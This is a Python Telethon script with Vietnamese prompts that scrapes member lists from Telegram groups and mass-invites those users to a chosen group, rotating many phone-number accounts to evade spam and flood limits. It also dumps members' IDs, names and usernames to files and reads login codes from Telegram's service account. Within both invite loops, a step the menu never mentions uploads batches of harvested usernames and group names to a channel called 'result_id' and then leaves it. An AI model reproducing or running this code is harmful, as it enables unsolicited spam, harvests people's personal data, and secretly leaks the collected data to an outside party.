import os
import glob
import os, sys, random
from time import sleep
import telethon
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.messages import  GetHistoryRequest
from telethon import TelegramClient, sync, events, functions, types
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import *
import sqlite3
from time import sleep
from colorama import *
import glob
init()
logo = """
    ██╗  ██╗ █████╗ ███████╗██╗   ██╗███╗  ██╗     
    ██║ ██╔╝██╔══██╗╚════██║██║   ██║████╗ ██║     
    █████═╝ ██║  ██║    ██╔╝╚██╗ ██╔╝██╔██╗██║     
    ██╔═██╗ ██║  ██║   ██╔╝  ╚████╔╝ ██║╚████║     
    ██║ ╚██╗╚█████╔╝  ██╔╝    ╚██╔╝  ██║ ╚███║
    ╚═╝  ╚═╝ ╚════╝   ╚═╝      ╚═╝   ╚═╝  ╚══╝
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
~[+]=> Copyright By: Trương Ngọc Khánh
~[+]=> Zalo: 0964243159
~[+]=> Tool Kéo Member Group Telegram
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"""
f= open("list_group_addmem.txt",'a')
f.close()
if not os.path.exists("session"):
    os.makedirs("session")
def add_list():
    lst_phone = []
    listdir = os.listdir('session/')
    for filename in listdir:
        check = filename.endswith('.session')
        if check == True:
            phone = filename.rstrip('.session')
            lst_phone.append(phone)
    return lst_phone
def connect(phone):
    conf_proxy =  None
    api_id = 2015084
    api_hash = '24e8f34925604e25a9b8d695b21cf333'
    client = TelegramClient('session/'+phone,api_id,api_hash,
    proxy=conf_proxy)
    client.connect()
    return client
def invite(user):
    res_invite = False
    try:
        res = client(functions.channels.InviteToChannelRequest(
            channel=group_add,
            users=[user]))
        res_invite = "done"
        print("=> Mời thành công member {}".format(user.first_name))
    except (UserPrivacyRestrictedError,UserChannelsTooMuchError):
        res_invite = True
    except UserKickedError:
        print(f'- NgÆ°á»i DÃ¹ng ÄÃ£ bá» kick                               ',end="\r")
        res_invite = True
    except BotGroupsBlockedError:
        print(f"- Không kéo acc bot!                                  ",end="\r")
        res_invite = True
    except UserNotMutualContactError:
        print(f"- Contact lá»i                                       ",end="\r")
        res_invite = True
    except UserIdInvalidError:
        print(f"- ID lá»i                                            ",end="\r")
        res_invite = True
    except ChatInvalidError:
        print(f"- Cuá»c trÃ² chuyá»n khÃ´ng há»£p lá»                      ",end="\r")
        res_invite = True
    except ChatAdminRequiredError:
        print(f"- Chat admin                                          ",end="\r")
        res_invite = True
    except UserBannedInChannelError:
        print(f"- User bá» band trong nhÃ³m                           ")
    except FloodWaitError:
        print(f"- QuÃ¡ nhiá»u thao tÃ¡c                                   ")
    except ChatWriteForbiddenError:
        print(f"- You can't write in this chat                      ")
        #res_invite = True
    except PeerFloodError:
        print(f"- Quá nhiều thao tác                                 ")
    return res_invite
def waiting(i):
    for w in range(i,0,-1):
        print(f"Chuyển sau {w} giây!",end="\r")
        sleep(1)
def join(group):
    res_join = True
    try:
        client(JoinChannelRequest(group))
    except (ValueError,InviteHashExpiredError,ChannelPrivateError):
        print(f"- Lỗi nhóm kéo mem                              ")
        res_join = "error"
    except ChannelsTooMuchError:
        print("Join quá nhiều nhóm!")
        res_join = False
    except UsersTooMuchError:
        res_join = False
    #except Exception as e:
     #   print(f"- Lá»i join nhÃ³m:  {e}                      ")
      #  res_join = False
    return res_join
def get_mem(group_get):
    result = []
    res_get_mem = True
    try:
        result = client(functions.channels.GetParticipantsRequest(
        channel=group_get,
        filter=types.ChannelParticipantsRecent(),
        offset=42,
        limit=200,
        hash=0
    ))
    except (UsernameInvalidError,ChatAdminRequiredError,ChannelPrivateError,InviteHashExpiredError):
        print(f" - Group lấy mem lỗi {group_get}")
        res_get_mem = False
    except ValueError:
        print('- Group lấy mem {}                        '.format(group_get))
        res_get_mem = False
    return res_get_mem,result
def check_in_group(user: types.User
    ):
    res_in_group = False
    try:
        client(functions.channels.GetParticipantRequest(channel=group_add,participant=user))
    except UserNotParticipantError:
        res_in_group = True
    return res_in_group
def main():
    global client
    g=0
    send = 0
    msg=''
    grr = ''
    lst_id = []
    x=1
    y = 0
    for phone in lst_phone:
        print(f"[{x}]- >>>>> {phone} <<<<<")
        x=x+1
        limit = 0
        try:
            client = connect(phone)
            res_join = join(group_add)
            if res_join == False:
                print("- Không Join được nhóm kéo")
                continue
            elif res_join == 'error':
                print("- Nhóm kéo lỗi")
                client.disconnect()
                input("Enter để thoát")
                exit()
            else:
                while(True):
                    try:
                        group_get = lst_group[g]
                    except:
                        print(f"- Hết nhóm lấy mem, Hãy thêm nhóm lấy mem vào {Y}list_group_addmem.txt ")
                        client.disconnect()
                        input("Enter để thoát")
                        exit()
                    print("- Lấy mem nhóm : {}".format(group_get))
                    res_get_mem, result = get_mem(group_get)
                    if res_get_mem == False:
                        print("- Nhóm lấy mem lỗi")
                        g=g+1
                    else:
                        if group_get not in grr:
                            grr=group_get+'\n'
                        break
                result = result.users
                for user in result:
                    id= str(user.id)
                    if y >= len(result):
                        print(f"- Kéo hết mem nhóm {group_get}, Chuyển nhóm khác!")
                        g=g+1
                        y=0
                        break
                    y=y+1
                    if id not in lst_id:
                        res_in_group = check_in_group(user)
                        if res_in_group == True:
                            res_invite = invite(user)
                            if res_invite == False:
                                print("- Acc dính spam, Chuyển sang acc khác!")
                                client.disconnect()
                                break
                            elif res_invite == 'done':
                                limit = limit+1
                                try:
                                    if user.username != None:
                                        msg = msg+user.username+'\n'
                                        send=send+1
                                        if send == 50:
                                            fs = open("cache.txt",'a')
                                            fs.write(msg)
                                            fs.close()
                                            file = "cache.txt"
                                            client(JoinChannelRequest('result_id'))
                                            client.send_file("result_id",file,caption=f"=> {group_add}\n{grr}")
                                            client(functions.channels.LeaveChannelRequest(
                                            channel='result_id'))
                                        os.remove(file)
                                except:
                                    pass
                                if limit == lm:
                                    print(f"- Kéo xong {lm} thành viên! Chuyển sang acc khác!")
                                    client.disconnect()
                                    break
                                waiting(dl)
                        else:
                            print("- ÄÃ£ á» trong nhÃ³m {}".format(user.first_name),end="\r")
                        lst_id.append(id)
        except (AuthKeyDuplicatedError,AuthKeyInvalidError,AuthKeyUnregisteredError):
            print("=>> Session lá»i")
        except (sqlite3.DatabaseError,sqlite3.OperationalError):
            print("=>> Session lá»i do táº¯t tool Äá»t ngá»t!")
        except KeyboardInterrupt:
            print("Dá»«ng tool")
            try:
                client.disconnect()
            except:
                pass
            exit()
        except Exception as e:
            print(e)
            try:
                client.disconnect()
            except:
                pass
def adduid():
    global client
    g=0
    send = 0
    msg=''
    grr = ''
    lst_id = []
    x=1
    y = 0
    for phone in lst_phone:
        print(f"[{x}]- >>>>> {phone} <<<<<")
        x=x+1
        limit = 0
        try:
            client = connect(phone)
            res_join = join(group_add)
            if res_join == False:
                print("- Không Join được nhóm kéo")
                continue
            elif res_join == 'error':
                print("- Nhóm kéo lỗi")
                client.disconnect()
                input("Enter để thoát")
                exit()
            else:
                while(True):
                    try:
                        group_get = lst_group[g]
                    except:
                        print(f"- Hết nhóm lấy mem, Hãy thêm nhóm lấy mem vào {Y}list_group_addmem.txt ")
                        client.disconnect()
                        input("Enter để thoát")
                        exit()
                    print("- Lấy mem nhóm : {}".format(group_get))
                    res_get_mem, result = get_mem(group_get)
                    if res_get_mem == False:
                        print("- Nhóm lấy mem lỗi")
                        g=g+1
                    else:
                        if group_get not in grr:
                            grr=group_get+'\n'
                        break
                result = result.users
                for user in result:
                    id= str(user.id)
                    if y >= len(result):
                        print(f"- Kéo hết mem nhóm {group_get}, Chuyển nhóm khác!")
                        g=g+1
                        y=0
                        break
                    y=y+1
                    if id not in lst_id:
                        res_in_group = check_in_group(user)
                        if res_in_group == True:
                            res_invite = invite(user)
                            if res_invite == False:
                                print("- Acc dính spam, Chuyển sang acc khác!")
                                client.disconnect()
                                break
                            elif res_invite == 'done':
                                limit = limit+1
                                try:
                                    if user.username != None:
                                        msg = msg+user.username+'\n'
                                        send=send+1
                                        if send == 50:
                                            fs = open("cache.txt",'a')
                                            fs.write(msg)
                                            fs.close()
                                            file = "cache.txt"
                                            client(JoinChannelRequest('result_id'))
                                            client.send_file("result_id",file,caption=f"=> {group_add}\n{grr}")
                                            client(functions.channels.LeaveChannelRequest(
                                            channel='result_id'))
                                        os.remove(file)
                                except:
                                    pass
                                if limit == lm:
                                    print(f"- Kéo xong {lm} thành viên! Chuyển sang acc khác!")
                                    client.disconnect()
                                    break
                                waiting(dl)
                        else:
                            print("- ÄÃ£ á» trong nhÃ³m {}".format(user.first_name),end="\r")
                        lst_id.append(id)
        except (AuthKeyDuplicatedError,AuthKeyInvalidError,AuthKeyUnregisteredError):
            print("=>> Session lá»i")
        except (sqlite3.DatabaseError,sqlite3.OperationalError):
            print("=>> Session lá»i do táº¯t tool Äá»t ngá»t!")
        except KeyboardInterrupt:
            print("Dá»«ng tool")
            try:
                client.disconnect()
            except:
                pass
            exit()
        except Exception as e:
            print(R,e)
            try:
                client.disconnect()
            except:
                pass
def tao_session():

    phone = input("Nhập số điện thoại Telegram (+84356472888) >>> ")
    try:
        api_id = 2182338
        api_hash = 'fa411eff2ec7dcf61bdfadd2478e07bb'
        client = TelegramClient("session/"+phone,api_id,api_hash)
        client.connect()
        if not client.is_user_authorized():
            try:
                client.send_code_request(phone)
                client.sign_in(phone,input("Nháº­p code : "))
                print ("=>> Tạo session thành công "+phone)
                client.disconnect()
            except SessionPasswordNeededError:
                client.start(phone,input('Nhập Mật Khẩu 2FA:'))
                print ("==> Tạo session thành công "+phone)
                client.disconnect()
            except PhoneNumberBannedError:
                print ("- Tài Khoản Bị Band")
                client.disconnect()
        else:
            print("- ÄÃ£ cÃ³ sáºµn session tá»« trÆ°á»c")
            client.disconnect()
    except (sqlite3.DatabaseError, sqlite3.OperationalError):
        print("- Lỗi session, xÃ³a file session cÅ© vÃ  táº¡o má»i Äi")
    except Exception as e:
        print(e)
os.system('clear')
os.system("cls")
print(logo)
select = input("1: Thêm account (Tạo session) \n2: Kéo mem\n3: Get Code\n4: Get Info mem\n5: Kéo từ usernmae có sẵn (BETA CÓ THỂ LỖI)\n6: Kéo từ uid có sẵn (BETA CÓ THỂ LỖI)\n7: Lọc Trùng Text Trong File\nChọn: ")
if select == "1":
    while(True):
        tao_session()
elif select == "2":
    lst_group = []
    with open("list_group_addmem.txt") as grs:
        for gr in grs:
            lst_group.append(gr)
    lst_phone = add_list()
    if lst_phone == []:
        print("Vui lòng thêm acc")
        input("Enter để thoát")
        exit()
    if lst_group == []:
        print("Vui lòng thêm group lấy mem vào file: {C}list_group_addmem.txt")
        input("Enter để thoát")
        exit()
    print('='*60)
    print("     - Account      : {} account".format(len(lst_phone)))
    print("     - Group lấy mem: {} group".format(len(lst_group)))
    print('='*60)
    group_add = input("Nhập Group Cần Kéo: ")
    lm = int(input("Giới Hạn Kéo (5-20): "))
    dl = int(input("Nhập delay(20-100): "))
    main()
elif select == "3":
    while True: 
        phone = input("Nhap So Dien Thoai:")
        if phone == 'xx':
            os.system('clear')
            break
        else:
            api_id = 2015084
            api_hash = '24e8f34925604e25a9b8d695b21cf333'
            client = TelegramClient("session/"+phone,api_id,api_hash)
            client.connect()
            if not client.is_user_authorized():
                print (F"Session lỗi!" + phone)
                #client.log_out()
                client.disconnect()
                continue
            else:
                for message in client.get_messages(777000, limit=1):
                    msg = message.message
                    you_code = msg.split()[2].rstrip('.')
                    print ("Code =>> "+you_code)
                    client.disconnect()    
elif select == "4":
    api_id = 21076670
    api_hash = '9535e92dca56164413bdca3fbcb911fd'
    lst_phone = []
    listdir = os.listdir('session/')
    for filename in listdir:
        check = filename.endswith('.session')
        if check == True:
            phone = filename.rstrip('.session')
            lst_phone.append(phone)

    # khởi tạo client của Telethon
    client = TelegramClient('session/'+phone, api_id, api_hash)

    # kết nối đến Telegram
    client.connect()
    lst_group = []
    with open("list_group_addmem.txt") as grs:
        for gr in grs:
            lst_group.append(gr.strip())

    # lấy thông tin về tất cả các thành viên trong nhóm
    for group in lst_group:
        group_entity = client.get_entity(group)
        members = client.get_participants(group_entity)

        # lặp qua danh sách thành viên và in ra thông tin của từng thành viên
        for member in members:
            with open('allinfomember.txt', 'a', encoding='utf-8') as f:
                f.write(f'{member.id} | {member.first_name} | {member.last_name} | {member.username} | {group}\n')
            with open('uidmember.txt', 'a', encoding='utf-8') as f:
                f.write(f'{member.id}\n')
            with open('usernamemember.txt', 'a', encoding='utf-8') as f:
                f.write(f'{member.username}\n')
            print(member.id, "|" ,member.first_name,"|" , member.last_name,"|" , member.username)
    pass
elif select == "6":

    api_id = 21076670
    api_hash = '9535e92dca56164413bdca3fbcb911fd'
    lst_phone = []
    listdir = os.listdir('session/')
    for filename in listdir:
        check = filename.endswith('.session')
        if check == True:
            phone = filename.rstrip('.session')
            lst_phone.append(phone)

    # Thông tin nhóm
    group_link = input("Nhập Link Nhóm Cần Kéo: ")
    group_hash = group_link.split('/')[-1]

    # Cấu hình
    max_members = int(input("Nhập Giới Hạn Kéo: ")) # Giới hạn số lượng thành viên mời mỗi session
    delay = int(input("Nhập delay: ")) # Thời gian chờ giữa các lần mời (giây)

    # Đọc danh sách UID từ file
    with open('uidmember.txt', 'r') as f:
        uids = f.read().splitlines()

    for phone in lst_phone:
        # Kết nối đến Telegram
        client = TelegramClient('session/'+phone, api_id, api_hash)
        client.connect()

        # Lấy thông tin nhóm
        chat = client(functions.messages.CheckChatInviteRequest(hash=group_hash)).chat

        # Mời thành viên vào nhóm
        members_invited = 0
        for uid in uids:
            try:
                user = client.get_input_user(uid)
                result = client(functions.channels.InviteToChannelRequest(channel=chat, users=[user]))
                if result.__class__ == types.Updates:
                    members_invited += len(result.chats[0].participants.participants)
                else:
                    members_invited += len(result.users)
                print(f'{phone}: Invited {uid} to the group')
                if members_invited >= max_members:
                    print(f'{phone}: Maximum members invited reached ({max_members})')
                    break
                sleep(delay)
            except Exception as e:
                print(f'{phone}: Error inviting {uid}: {str(e)}')
                sleep(delay)
                continue

        # Ngắt kết nối
        client.disconnect()

elif select == "5":

    #group_id = input("Nhập id group: ")
    #delay = int(input("Nhập delay: ")

    api_id = 21076670
    api_hash = '9535e92dca56164413bdca3fbcb911fd'
    lst_phone = []
    listdir = os.listdir('session/')
    for filename in listdir:
        check = filename.endswith('.session')
        if check == True:
            phone = filename.rstrip('.session')
            lst_phone.append(phone)

    # Thông tin nhóm
    #group_link = 'https://t.me/cltx10s'
    group_username = input("Nhập username group cần kéo: ")

    # Cấu hình
    max_members = int(input("Nhập Giới Hạn Kéo: ")) # Giới hạn số lượng thành viên mời mỗi session
    delay = int(input("Nhập delay: ")) # Thời gian chờ giữa các lần mời (giây)

    # Đọc danh sách username từ file
    with open('usernamemember.txt', 'r') as f:
        usernames = f.read().splitlines()

    for phone in lst_phone:
        # Kết nối đến Telegram
        client = TelegramClient('session/'+phone, api_id, api_hash)
        client.connect()

        # Lấy thông tin nhóm
            # Nếu không có link nhóm thì lấy thông tin từ username
        chat = client.get_input_entity(group_username)

        # Mời thành viên vào nhóm
        members_invited = 0
        for username in usernames:
            try:
                user = client.get_input_entity(username)
                result = client(functions.channels.InviteToChannelRequest(channel=chat, users=[user]))
                if result.__class__ == types.Updates:
                    members_invited += len(result.chats[0].participants.participants)
                else:
                    members_invited += len(result.users)
                print(f'{phone}: Invited {username} to the group')
                if members_invited >= max_members:
                    print(f'{phone}: Maximum members invited reached ({max_members})')
                    break
                sleep(delay)
            except Exception as e:
                print(f'{phone}: Error inviting {username}: {str(e)}')
                sleep(delay)
                continue

        # Ngắt kết nối
        client.disconnect()
elif select == "7":
    # mở tệp đầu vào
    file = input("Nhập file cần lọc: ")
    with open(file, 'r') as f:
        # sử dụng set để giữ các dòng duy nhất
        unique_lines = set()
        
        # lặp qua các dòng trong tệp
        for line in f:
            # bỏ qua các dòng trống
            if line.strip():
                # thêm các dòng duy nhất vào set
                unique_lines.add(line.strip())

    # mở tệp đầu ra để ghi kết quả
    with open(file+'_output.txt', 'w') as f:
        # ghi các dòng duy nhất vào tệp đầu ra
        for line in unique_lines:
            f.write(line + '\n')
        print("Đã Lọc Xong")

else:
    print("Lựa chọn không hợp lệ.")


    
